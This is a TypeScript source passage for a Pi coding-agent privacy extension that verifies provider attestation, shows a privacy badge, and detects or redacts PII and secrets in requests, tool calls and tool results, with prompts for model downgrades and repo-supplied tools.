// The Pi extension entry — what a marketplace install (or privateer-agent) loads.
//
// Wires the package together: installs the attestation dispatcher at extension-init
// (spike-proven to intercept provider TLS from here), registers the config-only
// privacy providers, patches venice / OpenRouter requests, tracks the current model
// to compute its posture, and adds a `/verify` command. Structural Pi typing keeps
// it decoupled from Pi's exact internal types (verified against the installed
// ExtensionAPI / ProviderConfigInput in 0.80.3).

import { installAttestationDispatcher, dispatcherTransport } from "./attest/dispatcher.ts";
import { PRIVACY_PROVIDERS, type PrivacyProvider } from "./providers/catalog.ts";
import { veniceRequestPatch, openRouterZdrPatch } from "./ext/patches.ts";
import { verifyModelPosture, type PostureResult } from "./posture/verify.ts";
import { TIERS, type PrivacyTier } from "./posture/tiers.ts";
import { effectiveTier } from "./posture/effective.ts";
import {
  detectPii,
  scanPii,
  redactPii,
  summarizePii,
  piiDetail,
  piiInline,
  hasSecrets,
  secretHits,
  newPii,
  mergePiiBaseline,
  type PiiHit,
  type PiiType,
} from "./pii/detect.ts";
import { compileAllow, type AllowMatcher } from "./pii/allow.ts";
import { assessToolCall, type ToolAssessment } from "./ext/toolgate.ts";
import {
  rankSurface,
  summarizeSurface,
  surfaceReport,
  isRepoSupplied,
  type ToolInfoLike,
  type ToolSurfaceEntry,
} from "./surface/tools.ts";
import { readFileSync } from "node:fs";
import { createLedger, recordEgress, ledgerReport } from "./surface/ledger.ts";
import { toolResultText, redactToolResultContent } from "./ext/results.ts";
import { assessDowngrade, downgradeWarning } from "./posture/downgrade.ts";
import { rankModels, pickerOptionLabel, type PickerModel, type VerifiedTeeSignal } from "./posture/picker.ts";

// Verified-private tiers where PII needs no gate: an attested enclave can't read it,
// and a loopback endpoint never sends it. NOTE zdr-* is NOT here — a ZDR provider
// still SEES the data (it just doesn't retain it), so PII exposure remains.
function isVerifiedPrivate(tier: PrivacyTier | undefined): boolean {
  return tier === "tee-verified" || tier === "local";
}

// Extract the outbound message text for detection, and redact PII structurally in the
// payload's message content (string or content-part arrays).
function payloadText(payload: any): string {
  try {
    return JSON.stringify(payload?.messages ?? payload ?? "");
  } catch {
    return "";
  }
}
function redactPayloadPii(payload: any, allow?: AllowMatcher): any {
  if (!payload || typeof payload !== "object" || !Array.isArray(payload.messages)) return payload;
  const mask = (s: string) => redactPii(s, undefined, allow);
  const messages = payload.messages.map((m: any) => {
    if (typeof m?.content === "string") return { ...m, content: mask(m.content) };
    if (Array.isArray(m?.content)) {
      return {
        ...m,
        content: m.content.map((p: any) => (typeof p?.text === "string" ? { ...p, text: mask(p.text) } : p)),
      };
    }
    return m;
  });
  return { ...payload, messages };
}

// ── structural Pi surface (subset we use) ────────────────────────────────────
interface PiModel {
  provider?: string;
  id?: string;
  name?: string;
  baseUrl?: string;
}
// The model registry Pi exposes on event/command contexts. getAvailable() is the
// models the user has auth for (the honest set to offer in a picker); getAll() is
// every configured model. Both feature-detected — a restricted context may omit them.
interface PiModelRegistry {
  getAvailable?(): PiModel[];
  getAll?(): PiModel[];
}
interface PiCtx {
  hasUI?: boolean;
  modelRegistry?: PiModelRegistry;
  getModel?(): PiModel | undefined;
  // Every configured tool with its source metadata — the input to the tool-surface
  // axis. Present on event contexts; the restricted COMMAND context may omit it,
  // which is why the extension keeps a snapshot taken at session_start.
  getAllTools?(): ToolInfoLike[];
  ui?: {
    notify?: (message: string, level?: string) => void;
    select?: (title: string, options: string[], opts?: unknown) => Promise<string | undefined>;
    // Badge render surfaces, in descending preference. Present on event contexts (not
    // the restricted command context), and each host UI/mode may expose a different
    // subset — so every one is feature-detected before use and the badge walks a
    // fallback chain (see badgeSinks) rather than depending on any single method.
    setStatus?: (key: string, text: string | undefined) => void;
    setWidget?: (key: string, content: string[] | undefined, options?: unknown) => void;
    setTitle?: (title: string) => void;
  };
}
interface PiExtensionApiLike {
  registerProvider?(name: string, config: unknown): void;
  // Used by the downgrade guard to REVERT a model switch the user declines, and by the
  // /models picker to APPLY a chosen model. Returns false when no API key is available.
  // Feature-detected: without it the guard degrades to a warning and the picker says so.
  setModel?(model: unknown): boolean | Promise<boolean>;
  registerCommand?(
    name: string,
    options: { description?: string; handler: (args: unknown, ctx: PiCtx) => unknown },
  ): void;
  on(event: string, handler: (event: any, ctx: PiCtx) => any): void;
}

export interface PiPrivacyOptions {
  // Install the process-wide attestation dispatcher (default true). Set false if the
  // host already installed one (e.g. privateer-agent's boot.ts).
  installDispatcher?: boolean;
  // Register the config-only privacy providers (privateer/tinfoil/nearai/venice/
  // ollama) with seed models (default true). Built-in providers
  // (openrouter/fireworks) are left
  // to Pi so their model listings aren't clobbered.
  registerProviders?: boolean;
  // Enforce OpenRouter ZDR routing (default false — opt-in, since a model with no
  // zero-retention endpoint will 404 rather than fall back). VERIFIED honest: when
  // on, requests carry provider.{zdr:true,data_collection:"deny"}, which OpenRouter
  // observably enforces (it 404s if unsatisfiable), so the zdr-enforced badge is earned.
  enforceOpenRouterZdr?: boolean;
  // Called whenever the current model's posture is (re)computed — the badge feed.
  onPosture?: (result: PostureResult) => void;
  // Bind Tinfoil attestation to the real provider connection via the dispatcher
  // (default true when the dispatcher is installed). Falls back to httpsTransport.
  useDispatcherTransport?: boolean;
  // Override the tier resolution for providers pi-privacy doesn't know (e.g. a host's
  // private account channel). Return a PrivacyTier to use it (drives the PII gate +
  // badge), or undefined to fall back to pi-privacy's built-in verified posture.
  resolveTier?: (provider: string, modelId: string) => Promise<PrivacyTier | undefined> | PrivacyTier | undefined;
  // Capability signal for the `/models` picker ONLY: the host's Privateer ACCOUNT
  // channel can verify a model on select, so Privateer can be shown as "◆ Verifiable
  // TEE" (verifies on select) instead of its "⚠ ZDR (by policy)" floor. PER-MODEL:
  // pass a predicate, since a host verifies some Privateer models (its TEE channel) but
  // not others (its ZDR channel) — e.g. `(m) => loggedIn && privateerChannel(m.id) ===
  // "tee"`. A bare `true` applies uniformly. This is a CEILING/capability marker, never
  // a live verdict — the real posture still comes from resolveTier (or verifyModelPosture)
  // when a model is actually selected. Code-only and NOT settable from zero-code config
  // on purpose: it lifts a privacy LABEL, so only a host that genuinely operates the
  // account channel may assert it.
  privateerVerifiedTee?: VerifiedTeeSignal;
  // Posture-aware structured-PII policy on outbound requests. "warn" (default):
  // interactively warn + offer redact before sending PII down an UNVERIFIED channel;
  // "redact": silently mask; "off": disabled. Only acts below verified-TEE/local
  // (an attested/on-device channel is safe), and only where a UI can prompt. Detection
  // is best-effort structured PII + secrets (emails/phones/SSNs/cards/IPs, API keys/
  // tokens/private keys) — NOT a guarantee.
  piiPolicy?: "warn" | "redact" | "off";
  // Unattended signal for the PII gate (e.g. the host's "step away from the keyboard"
  // switch — privateer's no-quarter). While it returns true, the interactive
  // send-or-redact question is SWALLOWED the safe way: the payload is auto-redacted
  // and sent, and the decision is surfaced as output instead of a prompt — what was
  // masked (same masked samples as the prompt's detail view) and where it went. A
  // live function rather than a boolean because hosts flip this mid-session; a bare
  // `true` works for always-unattended surfaces. An explicit earlier "… + remember
  // for session" answer still wins — that was your standing instruction. Code-only
  // on purpose (not settable from config): it silences a question, so only the host
  // that owns the unattended state may assert it.
  piiUnattended?: boolean | (() => boolean);
  // Style the unattended auto-redact notice. Receives the plain notice text; returns
  // the string actually shown (e.g. wrapped in the host's palette colors so it reads
  // as its own kind of output, distinct from warnings). When provided the notice is
  // emitted at "info" level (the host owns the look); without it, plain text at
  // "warning" level so it stays visible.
  renderPiiAutoRedact?: (notice: string) => string;
  // Values that are NOT PII in this session — never counted, never redacted, never
  // prompted about. Entry forms: `me@acme.com` (exact, `*` globs), `@acme.com` or
  // `acme.com` (that domain and its subdomains), `10.0.0.0/8` (an IPv4 block), or any
  // exact/globbed value (`ghp_dead*`). Reserved-by-standard shapes (example.com,
  // *.test/.invalid/.local, noreply@*, @users.noreply.github.com, loopback and
  // link-local addresses) are allowed BY DEFAULT — they are what makes a repository
  // full of commit trailers and doc snippets prompt on every single turn. Suppressed
  // matches are still counted and shown in the prompt's detail view, never hidden.
  // A project-local config file may NOT add entries (see the trust floor in config.ts).
  piiAllow?: string[];
  // Include the built-in reserved-shape allowlist above (default true). Set false to
  // gate on example.com/loopback/no-reply addresses too.
  piiAllowDefaults?: boolean;
  // Show the live posture badge (default true). Updates on model switch + each request
  // so "verified vs asserted" is always glanceable, never on-demand-only.
  showBadge?: boolean;
  // Ordered fallback chain of UI surfaces for the badge. The FIRST one the current UI
  // actually exposes is used, so the badge still renders across host UIs/modes that
  // support different methods (not every context has setStatus). Default:
  // ["status","widget","title"] — the non-intrusive surfaces first, title as a
  // broad-reach last resort. Add "notify" to also surface changes as messages.
  badgeSinks?: BadgeSink[];
  // The key the badge writes under (setStatus/setWidget are keyed) so a host can
  // namespace or replace it. Default "pi-privacy".
  badgeKey?: string;
  // Fully custom badge renderer — overrides the sink chain entirely. Receives the
  // computed badge text, the tier, and the current context. Use to route the badge
  // anywhere (a custom widget, an external status line, telemetry).
  renderBadge?: (badge: string, tier: PrivacyTier | undefined, ctx: PiCtx) => void;
  // Guard PII/secrets leaving the machine via a TOOL call (bash curl, web-fetch, an
  // MCP tool, …) — ORTHOGONAL to model posture (a TEE/ZDR model doesn't stop a tool
  // exfiltrating data to a third party). "warn" (default): interactively confirm
  // before an egress tool call carrying PII/secrets; "block": always block such calls;
  // "off": disabled. In warn mode with no UI, a CREDENTIAL leak is blocked (loud +
  // safe) while mere PII is allowed with a notice.
  toolExfilPolicy?: "warn" | "block" | "off";
  // Guard credentials arriving IN a tool result — the ingest side. Every other gate
  // judges data on its way out; none watch what a `read .env` / `bash: env` / fetched
  // dump pulls INTO the session. Once a secret is in a tool result it is re-sent to
  // the provider on every later turn AND written to the plaintext session file on
  // disk, where it outlives the session. Redacting at ingest is strictly stronger
  // than warning at send — the secret never enters the transcript to begin with.
  // "warn" (default): prompt, offering to redact before it lands; "redact": always
  // mask; "off": disabled. CREDENTIALS ONLY (API keys, tokens, private keys) — not
  // consumer PII, because rewriting an email out of a file the agent is about to edit
  // corrupts its view of that file for no privacy gain. Independent of model posture:
  // a verified enclave doesn't stop the secret being written to your disk. With no UI
  // it redacts (loud + safe, mirroring the tool gate's credential default).
  toolResultPolicy?: "warn" | "redact" | "off";
  // Guard against a POSTURE DOWNGRADE: switching to a weaker-tier model re-sends the
  // whole accumulated session history — everything the private channel was
  // protecting — to the new provider on the very next turn. No per-request gate can
  // see this, because nothing about the request changed; only the transition reveals
  // it. "warn" (default): prompt when the tier drops and the context is known to
  // carry PII/secrets, offering to revert the switch; "block": always revert such a
  // switch; "off": disabled. With no UI, a downgrade carrying CREDENTIALS is
  // reverted (mirroring the tool gate's loud-and-safe default), mere PII notified.
  downgradePolicy?: "warn" | "block" | "off";
  // Register the `/models` command (default true): a privacy-ranked picker that lists
  // the models you can actually use, strongest privacy first, each labeled with what
  // it can offer — turning pi-privacy from an observer of your model choice into a
  // help for making it. Honest by construction: an attestable TEE model shows as
  // "Verifiable TEE" (a capability), never the live "Verified" badge, until you pick
  // it and attestation runs.
  modelPicker?: boolean;
  // The command name the picker registers under (default "models"; Pi's built-in is
  // the singular "model"). A host can rename it to avoid a clash with another extension.
  modelPickerCommand?: string;
  // The TOOL-SURFACE axis: an inventory of every tool in the session by PROVENANCE
  // (who supplied it — you, a package, or the repository you cloned) plus a ledger of
  // egress actually observed. Answers the question no per-call gate can — "my model
  // channel is a verified enclave, but who else is in the room?" — and matters in Pi
  // specifically because Pi loads skills and extensions from `.pi/` and `.agents/`
  // under the working directory, i.e. they arrive with the repo you cloned.
  //
  // "warn" (default): the inventory, plus a ONE-TIME prompt the first time a tool the
  // PROJECT supplied is about to run — the point where "you didn't install this" is
  // actionable rather than trivia. "report": the inventory and /surface listing, no
  // prompts ever. "off": the axis is disabled entirely.
  //
  // Deliberately NOT a permission system: pi deliberately ships no permission popups,
  // so this fires once per tool per session, on PROVENANCE, and never on every call.
  toolSurfacePolicy?: "warn" | "report" | "off";
  // The command name the surface listing registers under (default "surface").
  toolSurfaceCommand?: string;
}

// Config-only providers Pi doesn't ship: register these. Built-ins + custom skipped.
const BUILTIN = new Set(["openrouter", "fireworks"]);
const SEED_MODELS: Record<string, string> = {
  tinfoil: "deepseek-v4-pro",
  nearai: "zai-org/GLM-5.1-FP8",
  venice: "qwen3-coder-480b-a35b-instruct-turbo",
  ollama: "llama3.1",
  privateer: "near/zai-org/GLM-5.1-FP8",
};

function registerable(p: PrivacyProvider): boolean {
  return !!p.baseUrl && !BUILTIN.has(p.id) && p.id !== "custom";
}

// The status-bar badge for a tier. A glyph keyed off the traffic-light posture keeps
// verified (green 🛡) visibly distinct from asserted (yellow ⚠) and standard (• none)
// — the whole verified-vs-claimed thesis, made glanceable. `undefined` tier (not yet
// computed) shows a neutral pending marker rather than overclaiming a ceiling.
function postureBadge(tier: PrivacyTier | undefined): string {
  if (!tier) return "⋯ checking privacy";
  const info = TIERS[tier];
  const glyph =
    info.posture === "green" ? "🛡" : info.posture === "yellow" ? "⚠" : info.posture === "red" ? "⛔" : "•";
  return `${glyph} ${info.label}`;
}

// A UI surface the badge can render to. `status` (footer) and `widget` (line above
// the editor) are dedicated extension surfaces that don't disturb other UI; `title`
// replaces the session title (a broad-reach last resort); `notify` fires a message
// (used only on change, since paintBadge de-dupes). The badge walks the configured
// chain and renders to the FIRST surface the current UI actually exposes.
export type BadgeSink = "status" | "widget" | "title" | "notify";

function renderBadgeTo(
  ui: NonNullable<PiCtx["ui"]>,
  sink: BadgeSink,
  key: string,
  badge: string,
  tier: PrivacyTier | undefined,
): boolean {
  switch (sink) {
    case "status":
      if (typeof ui.setStatus === "function") return ui.setStatus(key, badge), true;
      return false;
    case "widget":
      if (typeof ui.setWidget === "function") return ui.setWidget(key, [badge]), true;
      return false;
    case "title":
      if (typeof ui.setTitle === "function") return ui.setTitle(badge), true;
      return false;
    case "notify":
      if (typeof ui.notify === "function")
        return ui.notify(badge, TIERS[tier ?? "standard"].posture === "green" ? "info" : "warning"), true;
      return false;
    default:
      return false;
  }
}

function providerConfig(p: PrivacyProvider): unknown {
  const seed = SEED_MODELS[p.id];
  const models = seed
    ? [
        {
          id: seed,
          name: seed,
          reasoning: false,
          input: ["text"] as ("text" | "image")[],
          cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
          contextWindow: 128000,
          maxTokens: 4096,
        },
      ]
    : [];
  const cfg: Record<string, unknown> = { name: p.label, baseUrl: p.baseUrl, api: p.api, models };
  if (p.keyEnv) {
    cfg.apiKey = p.keyEnv; // env template ${...}; Pi resolves it
    cfg.authHeader = true;
  } else if (p.local && models.length) {
    // Pi requires apiKey (or oauth) whenever a provider defines models. Local
    // servers (ollama) ignore the auth header, so a placeholder satisfies the
    // validation without sending a meaningful credential.
    cfg.apiKey = "local";
  }
  return cfg;
}

function nearApiKey(): string | undefined {
  // Both spellings are used in the wild (see privateer redact.ts).
  return process.env.NEARAI_API_KEY ?? process.env.NEAR_AI_API_KEY;
}

export function makePiPrivacyExtension(opts: PiPrivacyOptions = {}) {
  const {
    installDispatcher = true,
    registerProviders = true,
    enforceOpenRouterZdr = false,
    onPosture,
    useDispatcherTransport = true,
    piiPolicy = "warn",
    piiUnattended = false,
    renderPiiAutoRedact,
    piiAllow = [],
    piiAllowDefaults = true,
    showBadge = true,
    badgeSinks = ["status", "widget", "title"],
    badgeKey = "pi-privacy",
    renderBadge,
    toolExfilPolicy = "warn",
    toolResultPolicy = "warn",
    downgradePolicy = "warn",
    modelPicker = true,
    modelPickerCommand = "models",
    toolSurfacePolicy = "warn",
    toolSurfaceCommand = "surface",
    resolveTier,
    privateerVerifiedTee = false,
  } = opts;

  return function piPrivacy(pi: PiExtensionApiLike): void {
    if (installDispatcher) installAttestationDispatcher();

    if (registerProviders && typeof pi.registerProvider === "function") {
      for (const p of PRIVACY_PROVIDERS) {
        if (registerable(p)) pi.registerProvider(p.id, providerConfig(p));
      }
    }

    let currentProviderId: string | undefined;
    let currentModelId: string | undefined;
    // The VERIFIED tier of the current model (attestation result), cached for the PII
    // gate. Undefined until computed → the gate treats "unknown" as not-verified (safe).
    let currentTier: PrivacyTier | undefined;
    // Session PII decision so we don't re-prompt every turn once the user has chosen.
    let piiChoice: "ask" | "send" | "redact" = "ask";
    // Live unattended signal — read at gate time, every time, because hosts flip it
    // mid-session (privateer's shift+tab no-quarter toggle).
    const piiUnattendedNow = (): boolean =>
      typeof piiUnattended === "function" ? !!piiUnattended() : !!piiUnattended;
    // PII already decided about this session, per type, and what was decided. The
    // outbound payload carries the WHOLE conversation, so without this the same 12
    // emails re-prompt on every turn until you latch a blanket "remember for session"
    // — which is how a gate trains you to dismiss it. With it, a decision covers the
    // PII it was made about, and a NEW type (or one more of a type) prompts again.
    let piiSeen: Map<PiiType, number> = new Map();
    let piiLastAction: "send" | "redact" | undefined;
    // The allowlist matcher — values this session doesn't treat as PII at all.
    const piiAllowed = compileAllow(piiAllow, {
      defaults: piiAllowDefaults,
      warn: (m) => console.warn(`[pi-privacy] ${m}`),
    });
    const scanOpts = { allow: piiAllowed };
    // Session decision for the tool-exfil gate (allow egress with sensitive data).
    let toolAllow = false;
    // Session decision for the tool-RESULT (ingest) gate, so we don't re-prompt on
    // every credential-bearing result once the user has chosen.
    let resultChoice: "ask" | "redact" | "keep" = "ask";

    // ── tool-surface state ───────────────────────────────────────────────────
    // The tool inventory, snapshotted from an EVENT context (the command context is
    // restricted and may not expose getAllTools). Refreshed whenever we see a context
    // that has it, so a mid-session extension reload is picked up.
    let toolSnapshot: ToolInfoLike[] = [];
    // Name → classification, for the first-use provenance gate. Rebuilt with the
    // snapshot so the gate and the listing can never disagree about who supplied what.
    let surfaceByName = new Map<string, ToolSurfaceEntry>();
    // Egress we actually OBSERVED, as opposed to reach a tool merely declares. A
    // floor, never an accounting — see surface/ledger.ts.
    const ledger = createLedger();
    const surfaceOn = toolSurfacePolicy !== "off";
    const captureTools = (ctx: PiCtx | undefined) => {
      if (!surfaceOn || typeof ctx?.getAllTools !== "function") return;
      try {
        const tools = ctx.getAllTools();
        if (!Array.isArray(tools)) return;
        toolSnapshot = tools;
        surfaceByName = new Map(rankSurface(tools).map((e) => [e.name, e]));
      } catch {
        // A host that throws here still gets every other guard; the surface section
        // just reports what it has (nothing) rather than taking the extension down.
      }
    };

    // ── the first-use provenance gate (toolSurfacePolicy: "warn") ────────────────
    // Tools the user did not supply — they came with the working directory, or with a
    // --skill flag for this run. Answered once per tool, and once for all of them via
    // the session latch, because a gate that fires on every call is a gate people turn
    // off. Never fires for builtin/user/package: those you chose.
    const provenanceSeen = new Set<string>();
    let projectToolsAllowed = false;

    // Show the file a repo-supplied tool came from. Pi's own docs say to review skill
    // content before use; "[Show me the file]" is that advice made reachable at the
    // moment it matters, instead of a warning that assumes you already did.
    const previewSource = (entry: ToolSurfaceEntry): string => {
      const path = entry.sourcePath;
      if (!path) return "No source path recorded for this tool — nothing to show.";
      try {
        const text = readFileSync(path, "utf8");
        const clipped = text.length > 4000 ? `${text.slice(0, 4000)}\n… (truncated)` : text;
        return `${path}:\n${clipped}`;
      } catch (e) {
        // Say we couldn't rather than implying an empty file is a harmless one.
        return `Could not read ${path}: ${(e as Error).message}`;
      }
    };

    const guardProvenance = async (toolName: string, ctx?: PiCtx): Promise<"allow" | "block"> => {
      if (toolSurfacePolicy !== "warn" || projectToolsAllowed) return "allow";
      const entry = surfaceByName.get(toolName);
      // No inventory (a host that doesn't expose getAllTools) means we cannot say where
      // this tool came from — and a prompt that asserts a provenance we didn't
      // establish is exactly the overclaim this package refuses to make. Stay quiet.
      if (!entry || !isRepoSupplied(entry.provenance)) return "allow";
      if (provenanceSeen.has(toolName)) return "allow";

      const ui = ctx?.ui ?? lastUi;
      const warning =
        `⚠ \`${toolName}\` was ${entry.concern}. It is about to run for the first time this session. ` +
        `This says where it came FROM, not that it is unsafe.`;

      if (!(ctx?.hasUI ?? lastHasUI) || typeof ui?.select !== "function") {
        // No UI (print/JSON, automated): allow with a notice. Provenance is a signal,
        // not a detected secret — unlike a credential heading off-machine, there is
        // nothing here worth breaking an unattended run over.
        provenanceSeen.add(toolName);
        ui?.notify?.(warning, "warning");
        return "allow";
      }

      // Bounded: "Show me the file" re-asks, but only so many times, so a handler can
      // never sit in a prompt loop.
      for (let i = 0; i < 3; i++) {
        const choice: string | undefined = await ui.select(warning, [
          "Run it",
          "Show me the file",
          "Allow project tools for this session",
          "Block",
        ]);
        if (choice === "Show me the file") {
          ui.notify?.(previewSource(entry), "info");
          continue;
        }
        if (choice === "Allow project tools for this session") {
          projectToolsAllowed = true;
          provenanceSeen.add(toolName);
          return "allow";
        }
        if (choice === "Run it") {
          // Latched only on an ALLOW. A block that latched would silently wave the
          // tool through the moment the model retried it.
          provenanceSeen.add(toolName);
          return "allow";
        }
        return "block"; // explicit "Block", or cancelled → the safe default
      }
      return "block"; // ran out of re-asks without a decision → safe default
    };

    // ── downgrade-guard state ────────────────────────────────────────────────
    // The tier the accumulated context was protected by at the moment of the last
    // switch, and the model to hand back to pi.setModel() if the user declines.
    let previousTier: PrivacyTier | undefined;
    let previousModel: unknown;
    // One prompt per transition: the guard runs twice (on the switch, using the new
    // model's ceiling, then again once attestation resolves the real tier, which can
    // only be lower). This latches after the first one that actually fires.
    let downgradeHandled = true;
    // What the last outbound payload was known to carry. Cached on EVERY request —
    // including verified-private ones, where the PII gate itself is skipped —
    // precisely so the guard knows what a private session accumulated before the
    // switch. Scanning is local, deterministic, and a few ms even on a full context.
    let contextHits: PiiHit[] = [];

    // The latest UI surface we've seen — captured from event contexts (the command
    // context is restricted), so refreshPosture() can paint the badge even though
    // model_select fires it without threading ctx through. `lastBadge` de-dupes so an
    // unchanged posture never re-renders (keeps a "notify" sink from spamming).
    let lastUi: NonNullable<PiCtx["ui"]> | undefined;
    let lastCtx: PiCtx | undefined;
    let lastBadge: string | undefined;
    // Whether the host can actually prompt. Captured alongside the UI because
    // guards that run detached from an event (the downgrade guard's second pass,
    // after attestation resolves) have no ctx of their own — and treating a TUI as
    // non-interactive would silently apply the no-UI fallback instead of asking.
    let lastHasUI = false;
    const captureUi = (ctx: PiCtx | undefined) => {
      if (ctx?.ui) ((lastUi = ctx.ui), (lastCtx = ctx), (lastHasUI = !!ctx.hasUI));
    };
    const paintBadge = () => {
      if (!showBadge || !lastUi) return;
      const badge = postureBadge(currentTier);
      if (badge === lastBadge) return; // unchanged → no-op
      let rendered = false;
      if (renderBadge) ((renderBadge(badge, currentTier, lastCtx!)), (rendered = true));
      else {
        for (const sink of badgeSinks) {
          if (renderBadgeTo(lastUi, sink, badgeKey, badge, currentTier)) {
            rendered = true;
            break;
          }
        }
      }
      if (rendered) lastBadge = badge; // only commit once something actually drew it
    };

    // Recompute posture for the current model; cache the tier and publish the badge.
    const refreshPosture = async () => {
      if (!currentProviderId || !currentModelId) return;
      // A host-supplied resolver (e.g. a private account channel pi-privacy doesn't
      // know) wins — otherwise use the built-in verified posture.
      if (resolveTier) {
        const t = await resolveTier(currentProviderId, currentModelId);
        if (t !== undefined) {
          currentTier = t;
          onPosture?.({ providerId: currentProviderId, modelId: currentModelId, tier: t });
          paintBadge();
          void guardDowngrade(t);
          return;
        }
      }
      const result = await verifyModelPosture(currentProviderId, currentModelId, {
        apiKey: currentProviderId === "nearai" ? nearApiKey() : undefined,
        zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
        transport: useDispatcherTransport && installDispatcher ? dispatcherTransport : undefined,
      });
      currentTier = result.tier;
      onPosture?.(result);
      paintBadge();
      // Re-check with the VERIFIED tier: a model whose ceiling looked fine can land
      // lower (attestation failed → tee-unverified), and that's still a downgrade.
      void guardDowngrade(result.tier);
    };

    // The posture-downgrade guard. Runs on a model switch and again once attestation
    // resolves, because the incoming tier can only get WORSE than its ceiling.
    // Fires only when the tier actually drops AND the context is known to carry
    // sensitive material — a bare tier change is what the badge is for.
    const guardDowngrade = async (toTier: PrivacyTier | undefined, ctx?: PiCtx) => {
      if (downgradePolicy === "off" || downgradeHandled) return;
      const a = assessDowngrade(previousTier, toTier, contextHits);
      if (!a.downgrade || a.severity === "none") return;
      downgradeHandled = true; // one prompt per transition

      const label = currentProviderId
        ? `${currentProviderId}${currentModelId ? `/${currentModelId}` : ""}`
        : undefined;
      const warning = downgradeWarning(a, contextHits, label);
      const revert = async () => {
        if (previousModel === undefined || typeof pi.setModel !== "function") {
          // Nothing to revert to (or the host can't switch) — say so rather than
          // implying the session was protected.
          (ctx?.ui ?? lastUi)?.notify?.(`${warning} Could not revert the switch automatically.`, "warning");
          return;
        }
        await pi.setModel(previousModel);
        (ctx?.ui ?? lastUi)?.notify?.(`Reverted to ${TIERS[a.from].label} — session context stays put.`, "info");
      };

      if (downgradePolicy === "block") return revert();

      const ui = ctx?.ui ?? lastUi;
      if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
        const choice = await ui.select(warning, [
          "Stay on the previous model",
          "Switch anyway",
          "Switch, redacting PII from now on",
        ]);
        if (choice === "Switch anyway") return;
        if (choice === "Switch, redacting PII from now on") {
          piiChoice = "redact";
          return;
        }
        return revert(); // explicit "Stay", or cancelled → the safe default
      }

      // No UI (print/JSON, automated): mirror the tool gate — a CREDENTIAL following
      // the session downhill is reverted (loud + safe), mere PII passes with a notice.
      if (a.severity === "secret") return revert();
      ui?.notify?.(warning, "warning");
    };

    // Snapshot the tool inventory once the session exists. Deliberately NOT done in
    // captureUi(): that runs on every request and tool call, and getAllTools() builds
    // a fresh array each time. The tool set only changes on a session start or an
    // extension reload, both of which re-fire this.
    pi.on("session_start", (_event, ctx) => {
      captureUi(ctx);
      captureTools(ctx);
    });

    pi.on("model_select", (event, ctx) => {
      const model = event?.model as PiModel | undefined;
      // Snapshot what the context was protected by BEFORE overwriting it — that's
      // the ceiling the accumulated history was written under.
      previousTier = currentTier;
      previousModel = event?.previousModel;
      downgradeHandled = false; // arm the guard for this transition
      // A different PROVIDER is a different audience: answering "send it" to one
      // company is not answering it for the next one, so the already-decided baseline
      // is dropped and the gate re-arms. An explicit "remember for session" is YOUR
      // standing instruction and deliberately survives.
      if (model?.provider !== currentProviderId) {
        piiSeen = new Map();
        piiLastAction = undefined;
      }
      currentProviderId = model?.provider;
      currentModelId = model?.id;
      captureUi(ctx);
      currentTier = undefined; // don't show the old model's badge while re-verifying
      paintBadge(); // pending marker until attestation resolves
      // Check against the incoming model's CEILING immediately, so the warning lands
      // before a turn can start; refreshPosture() re-checks with the verified tier.
      void guardDowngrade(
        effectiveTier(currentProviderId ?? "", {
          zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
        }),
        ctx,
      );
      void refreshPosture();
    });

    // Per-provider request patches + the posture-aware PII gate.
    pi.on("before_provider_request", async (event, ctx) => {
      captureUi(ctx); // keep the badge alive even if model_select had no UI
      paintBadge();
      let payload = event?.payload;
      // Provider-specific patches first (scoped to the current provider).
      if (currentProviderId === "venice") payload = veniceRequestPatch(payload);
      else if (currentProviderId === "openrouter" && enforceOpenRouterZdr) payload = openRouterZdrPatch(payload);

      // Scan the outbound payload — the full context that would be re-sent — and
      // cache the result for the downgrade guard. Done for EVERY tier, including
      // verified-private ones where the gate below is skipped: knowing what a
      // private session accumulated is the whole basis for guarding the switch out
      // of it. (Local + deterministic; a few ms on a full context.)
      const scan = scanPii(payloadText(payload), scanOpts);
      const hits = scan.hits;
      contextHits = hits;

      // PII gate: only below a VERIFIED-private tier (TEE-verified/local are safe —
      // the provider can't read the data), and only where we can actually prompt.
      if (piiPolicy !== "off" && !isVerifiedPrivate(currentTier)) {
        if (hits.length > 0) {
          let action: "send" | "redact" =
            piiChoice !== "ask" ? piiChoice : piiPolicy === "redact" ? "redact" : "send";
          // What is new since the last decision. Nothing new → the previous answer
          // still applies and we stay quiet; the moment something appears that was
          // never answered for, we ask again.
          const fresh = newPii(hits, piiSeen);
          const decided = piiChoice !== "ask" ? piiChoice : piiLastAction;
          if (fresh.length === 0 && decided) action = decided;

          if (fresh.length > 0 && piiChoice === "ask" && piiPolicy === "warn" && piiUnattendedNow()) {
            // Unattended (the host's no-quarter / step-away switch): nobody is at the
            // keyboard to answer, so the question is swallowed the SAFE way — redact
            // and send — and the decision surfaces as OUTPUT instead of a prompt:
            // what was masked (the same masked samples the prompt's detail view
            // shows, never a raw value) and where the redacted payload went.
            action = "redact";
            const notice =
              `⚑ unattended — PII auto-redacted before send: ${piiInline(scan)} → ` +
              `${TIERS[currentTier ?? "standard"].label} channel. ` +
              `Best-effort structured detection only, not a guarantee.`;
            const ui = ctx?.ui ?? lastUi;
            const rendered = renderPiiAutoRedact?.(notice);
            ui?.notify?.(rendered ?? notice, rendered ? "info" : "warning");
          } else if (
            fresh.length > 0 &&
            piiChoice === "ask" &&
            piiPolicy === "warn" &&
            ctx?.hasUI &&
            typeof ctx.ui?.select === "function"
          ) {
            const tierLabel = TIERS[currentTier ?? "standard"].label;
            const kind = hasSecrets(hits) ? "secrets/PII" : "structured PII";
            const again = piiLastAction ? ` (${summarizePii(fresh)} new since your last answer)` : "";
            const head =
              `⚠ ${summarizePii(hits)} detected${again} — sending to an unverified channel (${tierLabel}). ` +
              `Best-effort ${kind} detection only, not a guarantee.`;
            // "Show what was detected" re-opens the prompt with the masked breakdown
            // appended, so the detail is on the same screen as the choice.
            let title = head;
            for (let round = 0; round < 2; round++) {
              const options = [
                "Send as-is",
                "Redact PII",
                ...(round === 0 ? ["Show what was detected"] : []),
                "Redact + remember for session",
                "Send + remember for session",
              ];
              const choice = await ctx.ui.select(title, options);
              if (choice === "Show what was detected") {
                title = `${head}\n\n${piiDetail(scan)}`;
                continue;
              }
              if (choice === "Redact PII") action = "redact";
